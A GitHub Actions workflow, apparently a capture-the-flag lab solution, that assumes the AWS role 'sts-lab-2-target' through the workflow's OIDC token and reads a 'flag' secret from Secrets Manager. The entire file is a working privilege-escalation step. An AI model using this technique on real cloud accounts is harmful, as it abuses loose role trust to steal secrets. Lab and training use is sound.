name: Exploit STS Privilege Escalation

on:
  push:
    branches:
      - main

permissions:
  id-token: write
  contents: read

jobs:
  escalate:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Repository
        uses: actions/checkout@v3

      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v1
        with:
          aws-region: eu-west-1
          role-to-assume: arn:aws:iam::441564410720:role/sts-lab-2-target
          role-session-name: ExploitSession

      - name: Retrieve flag from SecretsManager
        run: aws secretsmanager get-secret-value --secret-id flag --region eu-west-1
